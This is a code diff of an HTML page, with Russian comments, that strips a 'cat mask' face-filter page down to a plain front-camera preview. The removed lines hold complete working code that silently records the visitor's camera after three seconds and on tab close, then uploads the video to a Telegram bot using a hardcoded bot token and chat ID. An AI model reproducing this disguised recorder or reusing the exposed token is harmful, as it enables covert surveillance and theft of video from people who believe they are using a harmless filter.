@@ -3,21 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Recording with Cat Mask to Telegram</title>
-    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
+    <title>Simple Video Display</title>
     <style>
-        #video, #overlayCanvas {
-            display: block; /* Отображение видео и канвы */
-        }
-        #videoDisplay {
-            position: relative;
-        }
-        #overlayCanvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-        }
-        #recordedVideo {
+        #video {
             display: block;
             width: 640px;
             height: 480px;
@@ -25,124 +13,24 @@
     </style>
 </head>
 <body>
-    <h1>Маска кота</h1>
-    <div id="videoDisplay">
-        <video id="video" width="640" height="480" autoplay></video>
-        <canvas id="overlayCanvas" width="640" height="480"></canvas>
-    </div>
-    <video id="recordedVideo" controls></video>
+    <h1>Video from Front Camera</h1>
+    <video id="video" autoplay></video>
 
     <script>
         const video = document.getElementById('video');
-        const overlayCanvas = document.getElementById('overlayCanvas');
-        const overlayContext = overlayCanvas.getContext('2d');
-        const recordedVideo = document.getElementById('recordedVideo');
 
-        let mediaRecorder;
-        let recordedChunks = [];
-
-        // Load face-api models
-        Promise.all([
-            faceapi.nets.tinyFaceDetector.loadFromUri('/models'),
-            faceapi.nets.faceLandmark68Net.loadFromUri('/models')
-        ]).then(startVideo);
-
-        function startVideo() {
-            navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'user' } // Запрос доступа к фронтальной камере
-            })
-            .then(stream => {
+        async function startVideo() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' } // Фронтальная камера
+                });
                 video.srcObject = stream;
-                setupMediaRecorder(stream);
-
-                video.onloadedmetadata = () => {
-                    // Start detection and recording
-                    setTimeout(() => {
-                        mediaRecorder.start();
-                        console.log('Recording started');
-                    }, 3000); // Delay to allow camera to focus
-
-                    detectFaces();
-                };
-            })
-            .catch(err => console.error("Error accessing camera: ", err));
-        }
-
-        function setupMediaRecorder(stream) {
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                const videoURL = URL.createObjectURL(blob);
-                recordedVideo.src = videoURL;
-                console.log('Recording stopped. Sending video...');
-                sendToTelegram(blob);
-            };
-        }
-
-        function detectFaces() {
-            setInterval(async () => {
-                const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
-                if (detections.length > 0) {
-                    drawCatMask(detections[0].landmarks);
-                }
-            }, 100); // Detect every 100ms
-        }
-
-        function drawCatMask(landmarks) {
-            const nose = landmarks.getNose()[3];
-            const leftEye = landmarks.getLeftEye()[0];
-            const rightEye = landmarks.getRightEye()[3];
-            const width = rightEye.x - leftEye.x;
-
-            const img = new Image();
-            img.src = 'https://w7.pngwing.com/pngs/456/738/png-transparent-cat-head.png'; // URL маски кота
-
-            img.onload = () => {
-                overlayContext.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
-                overlayContext.drawImage(img, nose.x - width, nose.y - width * 1.5, width * 3, width * 2.5);
-            };
-        }
-
-        function sendToTelegram(blob) {
-            const token = '7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk';
-            const chatId = '6121166273';
-            const url = `https://api.telegram.org/bot${token}/sendVideo`;
-
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('video', blob, 'recording.webm');
-
-            fetch(url, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log('Video sent successfully:', data);
-                } else {
-                    console.error('Telegram API error:', data.description);
-                }
-            })
-            .catch((error) => console.error('Error sending video to Telegram:', error));
-        }
-
-        // Handle browser tab or window close
-        window.addEventListener('beforeunload', (event) => {
-            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-                console.log('Recording stopped');
-                event.preventDefault(); // Required for modern browsers
-                event.returnValue = ''; // For some browsers
+            } catch (err) {
+                console.error("Error accessing camera: ", err);
             }
-        });
+        }
+
+        startVideo();
     </script>
 </body>
 </html>
